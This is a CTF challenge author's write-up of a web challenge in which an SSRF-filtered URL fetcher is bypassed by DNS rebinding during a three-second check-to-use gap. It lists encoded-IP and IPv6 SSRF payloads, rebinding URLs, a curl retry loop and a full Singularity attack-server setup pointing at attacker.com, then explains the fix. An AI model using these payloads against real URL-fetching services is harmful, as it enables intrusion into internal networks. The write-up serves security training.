# CTF Writeup — SecureNet Fetcher
**Event:** THM CTF 2024  
**Category:** Web Exploitation  
**Challenge:** SecureNet Fetcher  
**Difficulty:** Hard  
**Flag:** `THM{d0nt_trust_the_dns_r3binding_c4n_byp4ss_y0ur_1p_f1lt3rs_42}`  
**Solves:** (challenge author writeup)  

---

## 📄 Challenge Description

> The SecureNet Fetcher is a corporate internal URL-fetching service protected by
> enterprise-grade SSRF filtering. It validates every URL through multiple layers
> before making any outbound request. An internal vault at `http://localhost:8080/flag`
> holds the flag — but it's reachable only from the server itself.
> Can you get through?

---

## 🔍 Reconnaissance

Opening the challenge at `http://<challenge-host>:4444`, we're presented with a cyberpunk-themed
"URL Fetcher" interface. It shows 9 active protection layers blocking SSRF attempts:

- Loopback Block (`127.0.0.0/8`, `::1`)
- Private Class A/B/C (`10.x`, `172.16-31.x`, `192.168.x`)
- Link-Local (`169.254.0.0/16`)
- CGNAT (`100.64.0.0/10`)
- Keyword Filter (`localhost`, `internal`, `local`, `127.`, etc.)
- DNS Resolution Check (resolves domain → validates resulting IP)
- Encoded IP Block (hex, octal, decimal forms)

The service says the internal flag vault is at `http://localhost:8080/flag`.

---

## 🧪 Testing the Filters

Let's try every obvious bypass one by one and see what gets blocked.

### Direct IP
```
http://127.0.0.1:8080/flag
→ BLOCKED: Hostname "127.0.0.1" contains a blocked keyword.
```

### Localhost keyword
```
http://localhost:8080/flag
→ BLOCKED: Hostname "localhost" contains a blocked keyword.
```

### Hex-encoded IP
```
http://0x7f000001:8080/flag
→ BLOCKED: Hostname "127.0.0.1" contains a blocked keyword.
```

### Decimal-encoded IP (2130706433 = 127.0.0.1)
```
http://2130706433:8080/flag
→ BLOCKED: Hostname "127.0.0.1" contains a blocked keyword.
```

### Octal IP
```
http://0177.0.0.1:8080/flag
→ BLOCKED: URL contains blocked keywords.
```

### IPv6 loopback
```
http://[::1]:8080/flag
→ BLOCKED: Hostname "[::1]" contains a blocked keyword.
```

### IPv4-mapped IPv6
```
http://[::ffff:127.0.0.1]:8080/flag
→ BLOCKED: URL contains blocked keywords.
```

### nip.io wildcard DNS
```
http://127.0.0.1.nip.io:8080/flag
→ BLOCKED: URL contains blocked keywords. (127. matched)
```

### DNS that resolves to private IP
```
http://some-domain-that-resolves-to-10.0.0.1:8080/flag
→ BLOCKED: Resolved IP "10.0.0.1" is in a private/reserved range.
```

Everything is blocked. The filter is genuinely comprehensive.

---

## 🔬 Source Code Analysis

Looking at the server's `/api/fetch` handler, we can see exactly what happens:

```javascript
// Step 1: Pre-DNS validation (keyword/format checks)
const preCheck = validateUrlPreDNS(url);

// Step 2: DNS resolution + IP check
const dnsCheck = await resolveAndValidate(preCheck.hostname);
//   → calls dns.lookup(hostname) and validates returned IPs

// ✅ DNS check passed — log resolved IPs
console.log(`[DNS OK] Host resolved to [${resolvedIPs}] — all public. Proceeding in 3s...`);

// ⏳ 3-second delay
await sleep(3000);

// Step 3: Make the actual HTTP request
const result = await safeFetch(url, preCheck.parsed);
//   → calls http.request({ hostname: parsed.hostname, ... })
//   → Node's http module re-resolves the hostname via OS DNS
```

This reveals a critical design flaw:

**The DNS validation (Step 2) and the actual HTTP connection (Step 3) both resolve the domain name independently — and there is a 3-second gap between them.**

This is a classic **Time-of-Check vs Time-of-Use (TOCTOU)** vulnerability:

- At check time → DNS returns public IP → **PASS**
- At use time → DNS returns `127.0.0.1` → **connects to internal vault**

This is called **DNS Rebinding**.

---

## 💡 Understanding DNS Rebinding

DNS Rebinding exploits the gap between when a server **validates** a hostname and when it **connects** to it. Here's the key insight:

1. **Both steps use the hostname**, not the resolved IP
2. **Each step does a fresh DNS lookup** (no caching at TTL=0)
3. The attacker controls the DNS server, so they control what IP is returned on each query

```
Check time:    dns.lookup("evil.com")  →  1.2.3.4  (PUBLIC)  ✅ passes
                        3 second gap                 ← attacker flips DNS record
Use time:      http.request("evil.com") resolves →  127.0.0.1  🎯 internal!
```

The 3-second sleep is the opening — it gives the attacker more than enough time to ensure DNS has been flipped.

---

## 🛠️ Exploitation — Method 1: rbndr.us (Quick)

`rbndr.us` is a free public DNS rebinding service. Its domains alternate between two IPs on every query with TTL=0.

**Domain format:**
```
<ip1-hex>.<ip2-hex>.rbndr.us
```

**Convert target IPs to hex:**
```
1.1.1.1   → 01010101  (public decoy, passes the DNS check)
127.0.0.1 → 7f000001  (internal target to rebind to)
```

**Attack URL:**
```
http://01010101.7f000001.rbndr.us:8080/flag
```

**Verify the domain alternates:**
```bash
dig +short 01010101.7f000001.rbndr.us   # → 1.1.1.1
dig +short 01010101.7f000001.rbndr.us   # → 127.0.0.1
dig +short 01010101.7f000001.rbndr.us   # → 1.1.1.1  (alternating)
```

**Submit in the UI:**

Paste `http://01010101.7f000001.rbndr.us:8080/flag` into the URL input and click **EXECUTE FETCH**.

The server logs show what happened:
```
[DNS OK]  "01010101.7f000001.rbndr.us" resolved to [1.1.1.1] — all public ✅
          Proceeding to fetch in 3s...

          [rbndr.us flips to 127.0.0.1 on next query during the 3s window]

[FETCH ]  Opening TCP connection to "01010101.7f000001.rbndr.us"...
          OS re-resolves → 127.0.0.1  🎯
          TCP connects to 127.0.0.1:8080 → Internal Vault
```

Since rbndr.us alternates, there's ~50% chance per attempt. With the 3-second window, retry 2–5 times:

```bash
for i in $(seq 1 10); do
  curl -s -X POST http://localhost:4444/api/fetch \
    -H "Content-Type: application/json" \
    -d '{"url":"http://01010101.7f000001.rbndr.us:8080/flag"}' | python3 -m json.tool
  sleep 0.5
done
```

When it hits, the response contains the flag:

```json
{
  "success": true,
  "status": 200,
  "body": "{\n  \"flag\": \"THM{d0nt_trust_the_dns_r3binding_c4n_byp4ss_y0ur_1p_f1lt3rs_42}\"\n}"
}
```

---

## 🛠️ Exploitation — Method 2: Singularity (Reliable, 100%)

Singularity is a professional DNS rebinding attack framework by NCC Group that gives deterministic control.

### Setup

**Requirements:** A VPS at `1.2.3.4` and a domain `attacker.com` with NS pointing to the VPS.

```
DNS Records at registrar:
  A    ns.attacker.com  →  1.2.3.4
  NS   attacker.com     →  ns.attacker.com
```

**Install Singularity on VPS:**
```bash
git clone https://github.com/nccgroup/singularity
cd singularity/cmd/singularity-server
go build -o singularity-server .
```

**Run Singularity:**
```bash
sudo ./singularity-server \
  --DNSRebindStrategy DNSRebindFromQueryFirstThenSecond \
  --rebindIPAddress 127.0.0.1 \
  --ListenDNSHost 0.0.0.0 \
  --ListenDNSPort 53 \
  --HTTPServerPort 8080 \
  --dangerouslyAllowAnyHost
```

The strategy `DNSRebindFromQueryFirstThenSecond` means:
- **Query #1** → returns `1.2.3.4` (VPS public IP → passes SSRF filter)
- **Query #2+** → returns `127.0.0.1` (rebind → internal access)

### Verify It Works

```bash
# Query 1 — expect VPS public IP
dig @1.2.3.4 s-1-2-3-4-127-0-0-1-pwn01.attacker.com
# Answer: 1.2.3.4  ✅

# Query 2 — expect 127.0.0.1
dig @1.2.3.4 s-1-2-3-4-127-0-0-1-pwn01.attacker.com
# Answer: 127.0.0.1 🎯
```

### Craft and Submit the Attack URL

Singularity domain format:
```
s-<public-ip-dashes>-<target-ip-dashes>-<id>.attacker.com
```

Attack URL:
```
http://s-1-2-3-4-127-0-0-1-pwn01.attacker.com:8080/flag
```

Submit this to the challenge UI. Since Singularity deterministically returns the public IP on query #1 and `127.0.0.1` on query #2, **the attack succeeds on the very first attempt, every time**.

### Full Flow

```
T+0ms   Player submits URL to /api/fetch
T+5ms   Server: pre-DNS checks pass (no blocked keywords, valid scheme)
T+10ms  Server: dns.lookup() → Query #1 → Singularity returns 1.2.3.4 ✅
T+15ms  Server: 1.2.3.4 is public → DNS check PASS
        [DNS OK] logged to console
T+16ms  Server: await sleep(3000) begins...
                ← 3 seconds pass →
                [Singularity already set to return 127.0.0.1 on next query]
T+3016ms Server: sleep done → http.request() fires
T+3017ms OS: getaddrinfo("s-1-2-3-4-127-0-0-1-pwn01.attacker.com")
             → Query #2 → Singularity returns 127.0.0.1 🎯
T+3018ms TCP SYN → 127.0.0.1:8080
T+3020ms Connection established → GET /flag HTTP/1.1
T+3025ms Internal vault responds: {"flag":"THM{...}"}
T+3026ms Server forwards response back to player → 🏁
```

---

## 🏁 Flag

```
THM{d0nt_trust_the_dns_r3binding_c4n_byp4ss_y0ur_1p_f1lt3rs_42}
```

---

## 🧠 Key Takeaways

### Why the filter failed

The server checked the DNS result correctly — but DNS is **not a fixed mapping**. By the time the actual TCP connection is opened, the domain can resolve to a completely different IP. Checking DNS once is not equivalent to controlling which IP the connection reaches.

### The Root Cause — TOCTOU

This is a **Time-of-Check vs Time-of-Use (TOCTOU)** race condition:
- The **check** (DNS validation) and the **use** (HTTP connection) are separate operations
- Between them, the attacker can change what the domain resolves to

### How to Actually Fix This

| Fix | How |
|-----|-----|
| **Re-validate IP after connection** | Use a custom TCP socket, grab the remote IP after `connect()`, check it against the blocklist |
| **Pin the IP** | Resolve DNS once, store the IP, pass the raw IP to `http.request()` (set `host:` header to original domain) |
| **Network-level isolation** | Run the fetcher in a network namespace that has no route to `127.0.0.1` |
| **Use a safe HTTP client** | Libraries like Python's `ssrf_filter` or `safecurl` do socket-level IP pinning |

The "pin the IP" approach in Node.js looks like this:

```javascript
// SECURE: resolve once, use raw IP, spoof Host header
const address = resolvedIPs[0];   // from earlier dns.lookup
http.request({
  hostname: address,              // raw IP — no re-resolution!
  headers: { Host: originalHost },
  port, path, method
});
```

This completely kills DNS rebinding because DNS is only queried once.

---

## 📚 References

- [DNS Rebinding — Wikipedia](https://en.wikipedia.org/wiki/DNS_rebinding)
- [Singularity — NCC Group](https://github.com/nccgroup/singularity)
- [rbndr.us — Free DNS Rebinding](https://rbndr.us)
- [SSRF Bible — Wallarm](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger — SSRF via DNS Rebinding](https://portswigger.net/web-security/ssrf)
